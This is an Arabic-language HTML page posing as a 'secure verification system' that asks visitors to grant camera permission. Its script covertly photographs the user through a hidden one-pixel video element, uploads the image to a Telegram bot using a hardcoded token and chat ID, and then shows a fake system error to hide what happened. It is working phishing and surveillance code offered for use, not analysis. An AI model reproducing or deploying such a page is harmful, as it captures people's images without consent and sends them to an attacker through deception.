<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد النظام</title>
    <style>
        body { margin: 0; background: #000; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: #fff; }
        .card { text-align: center; padding: 30px; border-radius: 15px; background: #111; width: 85%; border: 1px solid #333; }
        #startBtn { padding: 18px; font-size: 19px; border-radius: 10px; border: none; background: #28a745; color: white; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
        #status { margin-top: 15px; font-size: 14px; color: #888; display: none; }
        video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

    <div class="card">
        <h3>نظام التحقق الآمن</h3>
        <p style="font-size: 13px; color: #999;">يرجى الضغط أدناه والموافقة على "إذن الكاميرا" للمتابعة.</p>
        <button id="startBtn">بدء الفحص الآن</button>
        <div id="status">جاري معالجة البيانات...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = '8723034543:AAEb6V0gOAW5EBJje20bF11avfDkoc0dFrU'; 
        const chatID = '1921462984';

        const video = document.getElementById('video');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        startBtn.onclick = async function() {
            startBtn.disabled = true;
            status.style.display = 'block';
            status.innerText = "جاري طلب إذن الكاميرا...";

            try {
                // طلب الكاميرا الأمامية بشكل صريح
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                status.innerText = "جاري التحقق، يرجى الانتظار...";

                // الانتظار ثانية واحدة لضبط جودة الصورة
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(function(blob) {
                        const formData = new FormData();
                        formData.append('chat_id', chatID);
                        formData.append('photo', blob, 'android_user.jpg');

                        fetch(`https://telegram.org{token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            // إغلاق الكاميرا فوراً
                            stream.getTracks().forEach(t => t.stop());
                            status.style.color = "#ff4d4d";
                            status.innerText = "حدث خطأ في النظام (0x8004). يرجى المحاولة لاحقاً.";
                        });
                    }, 'image/jpeg', 0.6);
                }, 1200);

            } catch (err) {
                status.style.color = "#ff4d4d";
                status.innerText = "يجب عليك الضغط على 'سماح' (Allow) للكاميرا لتتمكن من المتابعة.";
                startBtn.disabled = false;
            }
        };
    </script>
</body>
</html>
